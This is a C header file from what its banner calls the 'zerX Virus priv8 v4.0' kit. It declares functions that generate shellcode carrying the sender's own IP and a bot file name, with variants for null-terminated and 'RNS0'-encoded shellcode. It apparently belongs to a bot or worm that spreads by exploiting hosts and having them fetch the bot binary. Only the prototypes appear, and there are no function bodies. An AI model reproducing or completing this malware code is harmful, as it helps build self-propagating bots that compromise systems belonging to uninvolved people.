/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
DWORD GetShellcodeSize(char *ownip, char *botfilename);
DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename);
DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0EncodedSize(DWORD shellcodesize);
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize);
